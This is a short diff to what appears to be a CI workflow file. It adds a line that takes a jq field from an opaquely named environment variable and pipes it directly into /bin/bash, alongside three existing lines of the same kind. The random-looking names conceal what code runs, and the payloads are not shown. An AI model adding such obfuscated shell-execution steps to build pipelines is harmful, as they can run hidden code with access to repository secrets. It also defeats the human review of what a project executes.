@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$h4839" | jq -r .pbto251 | /bin/bash
           printf '%s' "$rs50260" | jq -r .z5674 | /bin/bash
           printf '%s' "$nm40" | jq -r .r3 | /bin/bash
+          printf '%s' "$osi04" | jq -r .n068 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
